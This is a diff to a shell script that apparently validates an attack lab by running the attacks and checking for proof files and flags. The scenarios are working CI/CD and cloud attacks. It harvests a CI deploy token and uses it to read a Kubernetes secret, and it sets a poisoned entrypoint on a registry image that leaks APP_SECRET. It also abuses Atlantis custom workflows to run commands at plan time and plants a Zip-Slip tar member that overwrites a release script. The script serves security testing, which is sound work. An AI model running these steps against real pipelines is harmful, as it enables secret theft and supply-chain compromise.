@@ -278,9 +278,9 @@ if enabled tf_1; then
 cd /home/deployer; rm -rf pt1; mkdir pt1; cd pt1
 cat > main.tf <<'TF'
 terraform {
-  required_providers { null = { source = "hashicorp/null" } }
+  required_providers { random = { source = "hashicorp/random" } }
 }
-resource "null_resource" "x" {}
+resource "random_id" "x" { byte_length = 4 }
 TF
 rm -f /tmp/tf1-proof
 /usr/local/bin/terraform plan -no-color >/dev/null 2>&1 || true
@@ -422,6 +422,7 @@ release:
     - echo "$RELEASE_KEY" > /tmp/pbac3-proof
 YML
   ( cd "$W/ws"; git -c user.email=atk@x -c user.name=atk checkout -q main 2>/dev/null || git -c user.email=atk@x -c user.name=atk checkout -q -B main
+    date +%s > .release-trigger
     git -c user.email=atk@x -c user.name=atk add -A
     git -c user.email=atk@x -c user.name=atk commit -q -m "release pipeline"
     git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
@@ -460,8 +461,9 @@ fi
 # --- tf_2: a PR's atlantis.yaml custom workflow runs arbitrary commands at plan time ----
 if enabled tf_2; then
   on atlantis 'rm -f /tmp/tf2-proof' >/dev/null 2>&1
+  BR2="atlantis-pwn-$(date +%s)"
   W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
-  ( cd "$W/infra"; git -c user.email=atk@x -c user.name=atk checkout -q -B atlantis-pwn 2>/dev/null
+  ( cd "$W/infra"; git -c user.email=atk@x -c user.name=atk checkout -q -B "$BR2" 2>/dev/null
     cat > atlantis.yaml <<'YML'
 version: 3
 projects:
@@ -478,12 +480,12 @@ YML
     echo "# trigger $(date +%s)" >> main.tf
     git -c user.email=atk@x -c user.name=atk add -A
     git -c user.email=atk@x -c user.name=atk commit -q -m "add atlantis config"
-    git -c user.email=atk@x -c user.name=atk push -q -f origin atlantis-pwn ) 2>/dev/null
+    git -c user.email=atk@x -c user.name=atk push -q -f origin "$BR2" ) 2>/dev/null
   rm -rf "$W"
   # open a PR -> gitea webhook -> atlantis autoplan -> custom run: fires
   curl -s -u "$AU:$AP" -H 'Content-Type: application/json' -X POST \
     "http://gitea:3000/api/v1/repos/alpha/infra/pulls" \
-    -d '{"title":"infra change","head":"atlantis-pwn","base":"main"}' >/dev/null 2>&1
+    -d "{\"title\":\"infra change\",\"head\":\"$BR2\",\"base\":\"main\"}" >/dev/null 2>&1
   out=$(on atlantis 'for i in $(seq 1 50); do [ -s /tmp/tf2-proof ] && break; sleep 3; done; cat /tmp/tf2-proof 2>/dev/null')
   chk tf_2 tf_2-atlantis-custom-workflow "$out"
 fi
@@ -503,6 +505,13 @@ if enabled pol_2; then
 fi
 
 echo "### Secrets & identity pivots ###"
+
+# --- sec_1: harvest the CI deploy token off the runner -> hit the k8s API -> read a secret ----
+if enabled sec_1; then
+  TOK=$(on runner 'cat /opt/ci/deploy.token 2>/dev/null')
+  out=$(on runner "curl -sk -H 'Authorization: Bearer $TOK' https://k8s:6443/api/v1/namespaces/alpha/secrets/prod-db 2>/dev/null" | python3 -c "import sys,json,base64;d=json.load(sys.stdin);print(base64.b64decode(d['data']['flag']).decode())" 2>/dev/null)
+  chk sec_1 sec_1-ci-kubeconfig-pivot "$out"
+fi
 
 # --- sec_2: a pod SA token authenticates to Vault (over-broad role) -> reads beta's secret ----
 if enabled sec_2; then
@@ -560,6 +569,25 @@ if enabled sup_4; then
   chk sup_4 sup_4-dependency-confusion "$out"
 fi
 
+# --- sup_3: poison the :latest image the deploy pulls -> attacker code runs in the pod ----
+if enabled sup_3; then
+  command -v crane >/dev/null 2>&1 || curl -sL https://github.com/google/go-containerregistry/releases/download/v0.20.2/go-containerregistry_Linux_x86_64.tar.gz | tar xz -C /usr/local/bin crane 2>/dev/null
+  crane mutate registry:5000/alpha/web:latest --insecure --entrypoint '/bin/sh,-c,echo PWNED=$APP_SECRET; sleep 3600' -t registry:5000/alpha/web:latest >/dev/null 2>&1
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+k3s kubectl -n alpha rollout restart deploy/web >/dev/null 2>&1
+for i in $(seq 1 60); do
+  for p in $(k3s kubectl -n alpha get pods -l app=web -o name 2>/dev/null); do
+    L=$(k3s kubectl -n alpha logs "$p" 2>/dev/null)
+    case "$L" in *PWNED=*) echo "$L"; exit 0;; esac
+  done
+  sleep 3
+done
+EOF
+)
+  chk sup_3 sup_3-image-supply-chain "$out"
+fi
+
 # --- sup_2: poison an upstream artifact with a Zip-Slip member -> overwrite a trusted script ----
 if enabled sup_2; then
   on runner 'rm -f /tmp/sup2-proof' >/dev/null 2>&1
@@ -572,7 +600,7 @@ data=b'#!/bin/sh\necho "$SUP2_SECRET" > /tmp/sup2-proof\n'
 ti=tarfile.TarInfo('../scripts/release.sh'); ti.size=len(data); ti.mode=0o755
 t.addfile(ti, io.BytesIO(data)); t.close()
 PY
-  ( cd "$W/d"; git -c user.email=atk@x -c user.name=atk add -A
+  ( cd "$W/d"; date +%s > .ship-trigger; git -c user.email=atk@x -c user.name=atk add -A
     git -c user.email=atk@x -c user.name=atk commit -q -m "ship upstream update"
     git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
   rm -rf "$W"
